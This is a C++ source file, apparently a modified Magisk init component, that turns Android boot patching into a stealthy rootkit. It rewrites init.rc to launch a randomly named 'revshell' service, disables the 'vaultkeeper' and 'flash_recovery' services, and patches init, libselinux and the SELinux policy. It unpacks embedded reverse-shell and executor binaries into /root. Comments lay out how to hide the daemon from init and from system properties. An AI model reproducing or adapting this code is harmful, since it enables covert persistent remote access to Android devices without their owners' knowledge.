#include <sys/mount.h>
#include <sys/wait.h>
#include <libgen.h>

#include <magisk.hpp>
#include <sepolicy.hpp>
#include <utils.hpp>
#include <socket.hpp>

#include "init.hpp"
#include "unxz.hpp"
#include "magiskrc.inc"

#ifdef USE_64BIT
#define LIBNAME "lib64"
#else
#define LIBNAME "lib"
#endif

#ifdef USE_64BIT
#include "binaries_revshell64.h"
#include "binaries_executor64.h"
#else
#include "binaries_revshell.h"
#include "binaries_executor.h"
#endif


using namespace std;

static vector<string> rc_list;

// two stealth issues lead to exposure of daemon:
//   1. init complains about flash_recovery being xxxxx
//   2. init sets prop init.svc.<name>

// solution:
//   1. redirect flash_recovery to existing yet invalid path, e.g. /dev/null
//   2. use resetprop to delete prop directly as daemon starts

static void patch_init_rc(const char *src, const char *dest, const char *tmp_dir) {
    FILE *rc = xfopen(dest, "we");
    file_readline(src, [=](string_view line) -> bool {
        // Do not start vaultkeeper
        if (str_contains(line, "start vaultkeeper")) {
            LOGD("Remove vaultkeeper\n");
            return true;
        }
        // Do not run flash_recovery
        if (str_starts(line, "service flash_recovery")) {
            LOGD("Remove flash_recovery\n");
            fprintf(rc, "service flash_recovery /dev/null\n");
            return true;
        }
        // Else just write the line
        fprintf(rc, "%s", line.data());
        return true;
    });

    fprintf(rc, "\n");

    // Inject revshell script
    char svc[16];
    gen_rand_str(svc, sizeof(svc));
    LOGD("Inject revshell payload: [%s]\n", svc);
    fprintf(rc, PAYLOAD_RC, tmp_dir, svc);

    fclose(rc);
    clone_attr(src, dest);
}

bool MagiskInit::patch_sepolicy(const char *file) {
    bool patch_init = false;
    sepolicy *sepol = nullptr;

    if (access(SPLIT_PLAT_CIL, R_OK) == 0) {
        LOGD("sepol: split policy\n");
        patch_init = true;
    } else if (access("/sepolicy", R_OK) == 0) {
        LOGD("sepol: monolithic policy\n");
        sepol = sepolicy::from_file("/sepolicy");
    } else {
        LOGD("sepol: no selinux\n");
        return false;
    }

    if (access(SELINUX_VERSION, F_OK) != 0) {
        // Mount selinuxfs to communicate with kernel
        xmount("selinuxfs", SELINUX_MNT, "selinuxfs", 0, nullptr);
        mount_list.emplace_back(SELINUX_MNT);
    }

    if (patch_init)
        sepol = sepolicy::from_split();

    sepol->magisk_rules();

    LOGD("Dumping sepolicy to: [%s]\n", file);
    sepol->to_file(file);
    delete sepol;

    // Remove OnePlus stupid debug sepolicy and use our own
    if (access("/sepolicy_debug", F_OK) == 0) {
        unlink("/sepolicy_debug");
        link("/sepolicy", "/sepolicy_debug");
    }

    return patch_init;
}

static void recreate_sbin(const char *mirror, bool use_bind_mount) {
    auto dp = xopen_dir(mirror);
    int src = dirfd(dp.get());
    char buf[4096];
    for (dirent *entry; (entry = xreaddir(dp.get()));) {
        string sbin_path = "/sbin/"s + entry->d_name;
        struct stat st;
        fstatat(src, entry->d_name, &st, AT_SYMLINK_NOFOLLOW);
        if (S_ISLNK(st.st_mode)) {
            xreadlinkat(src, entry->d_name, buf, sizeof(buf));
            xsymlink(buf, sbin_path.data());
        } else {
            sprintf(buf, "%s/%s", mirror, entry->d_name);
            if (use_bind_mount) {
                auto mode = st.st_mode & 0777;
                // Create dummy
                if (S_ISDIR(st.st_mode))
                    xmkdir(sbin_path.data(), mode);
                else
                    close(xopen(sbin_path.data(), O_CREAT | O_WRONLY | O_CLOEXEC, mode));

                xmount(buf, sbin_path.data(), nullptr, MS_BIND, nullptr);
            } else {
                xsymlink(buf, sbin_path.data());
            }
        }
    }
}

static string magic_mount_list;

static void magic_mount(const string &sdir, const string &ddir = "") {
    auto dir = xopen_dir(sdir.data());
    for (dirent *entry; (entry = xreaddir(dir.get()));) {
        string src = sdir + "/" + entry->d_name;
        string dest = ddir + "/" + entry->d_name;
        if (access(dest.data(), F_OK) == 0) {
            if (entry->d_type == DT_DIR) {
                // Recursive
                magic_mount(src, dest);
            } else {
                LOGD("Mount [%s] -> [%s]\n", src.data(), dest.data());
                xmount(src.data(), dest.data(), nullptr, MS_BIND, nullptr);
                magic_mount_list += dest;
                magic_mount_list += '\n';
            }
        }
    }
}

#define ROOTMIR     MIRRDIR "/system_root"
#define MONOPOLICY  "/sepolicy"
#define LIBSELINUX  "/system/" LIBNAME "/libselinux.so"
#define NEW_INITRC  "/system/etc/init/hw/init.rc"


// check if works on Android 10 ?  --  OK (android 10, 2si)
// TODO : magisk compatibility ?
// ----------- system as root ------------
void SARBase::patch_rootdir() {
    string tmp_dir;
    const char *sepol;

    if (access("/sbin", F_OK) == 0) {
        tmp_dir = "/sbin";
        sepol = "/sbin/.sp";  // crash on .se rename?     upd: OK if we don't change length
    } else
    // temporarily change to /dev/ for compatibility test with magisk ?
    {
        // char buf[8];
        // gen_rand_str(buf, sizeof(buf));
        // tmp_dir = "/dev/"s + buf;
        tmp_dir = "/dev/sys_ctl";
        xmkdir(tmp_dir.data(), 0);
        sepol = "/dev/.sp";
    }

    setup_tmp(tmp_dir.data());
    chdir(tmp_dir.data());

    mount_rules_dir(BLOCKDIR, MIRRDIR);

    // Mount system_root mirror
    xmkdir(ROOTMIR, 0700);
    xmount("/", ROOTMIR, nullptr, MS_BIND, nullptr);
    mount_list.emplace_back(tmp_dir + "/" ROOTMIR);

    // Recreate original sbin structure if necessary
    if (tmp_dir == "/sbin")
        recreate_sbin(ROOTMIR "/sbin", true);

    // Patch init
    int patch_count;
    {
        int src = xopen("/init", O_RDONLY | O_CLOEXEC);
        auto init = raw_data::read(src);
        patch_count = init.patch({
            make_pair(SPLIT_PLAT_CIL, "xxx"), /* Force loading monolithic sepolicy */
            make_pair(MONOPOLICY, sepol)      /* Redirect /sepolicy to custom path */
         });
        xmkdir(ROOTOVL, 0);
        int dest = xopen(ROOTOVL "/init", O_CREAT | O_WRONLY | O_CLOEXEC, 0);
        xwrite(dest, init.buf, init.sz);
        fclone_attr(src, dest);
        close(src);
        close(dest);
    }

    if (patch_count != 2 && access(LIBSELINUX, F_OK) == 0) {
        // init is dynamically linked, need to patch libselinux
        auto lib = raw_data::read(LIBSELINUX);
        lib.patch({make_pair(MONOPOLICY, sepol)});
        xmkdirs(dirname(ROOTOVL LIBSELINUX), 0755);
        int dest = xopen(ROOTOVL LIBSELINUX, O_CREAT | O_WRONLY | O_CLOEXEC, 0);
        xwrite(dest, lib.buf, lib.sz);
        close(dest);
        clone_attr(LIBSELINUX, ROOTOVL LIBSELINUX);
    }

    // sepolicy
    patch_sepolicy(sepol);

    // Restore backup files
    LOGD("Restore backup files locally\n");
    restore_folder(ROOTOVL, overlays);
    overlays.clear();

    // Patch init.rc
    if (access("/init.rc", F_OK) == 0) {
        patch_init_rc("/init.rc", ROOTOVL "/init.rc", tmp_dir.data());
    } else {
        // Android 11's new init.rc
        xmkdirs(dirname(ROOTOVL NEW_INITRC), 0755);
        patch_init_rc(NEW_INITRC, ROOTOVL NEW_INITRC, tmp_dir.data());
    }

    // Mount rootdir
    magic_mount(ROOTOVL);
    int dest = xopen(ROOTMNT, O_WRONLY | O_CREAT | O_CLOEXEC, 0);
    write(dest, magic_mount_list.data(), magic_mount_list.length());
    close(dest);

    chdir("/");
}

#define TMP_MNTDIR "/dev/mnt"
#define TMP_RULESDIR "/.rtk_backup/.sepolicy.rules"


// ---------- rootfs -----------
void RootFSInit::patch_rootfs() {
    // Handle custom sepolicy rules
    xmkdir(TMP_MNTDIR, 0755);
    mount_rules_dir("/dev/block", TMP_MNTDIR);
    // Preserve custom rule path
    if (!custom_rules_dir.empty()) {
        string rules_dir = "./" + custom_rules_dir.substr(sizeof(TMP_MNTDIR));
        xsymlink(rules_dir.data(), TMP_RULESDIR);
    }

    if (patch_sepolicy("/sepolicy")) {
        auto init = raw_data::mmap_rw("/init");
        init.patch({ make_pair(SPLIT_PLAT_CIL, "xxx") });
    }

    patch_init_rc("/init.rc", "/init.p.rc", "/sbin");
    rename("/init.p.rc", "/init.rc");

    // Create hardlink mirror of /sbin to /root
    mkdir("/root", 0750);
    clone_attr("/sbin", "/root");
    link_path("/sbin", "/root");

    // Extract revshell payload
    int fd = xopen("/root/revshell", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
    unxz(fd, revshell_xz, sizeof(revshell_xz));
    close(fd);

    fd = xopen("/root/executor", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0700);
    unxz(fd, executor_xz, sizeof(executor_xz));
    close(fd);

    recreate_sbin("/root", false);
}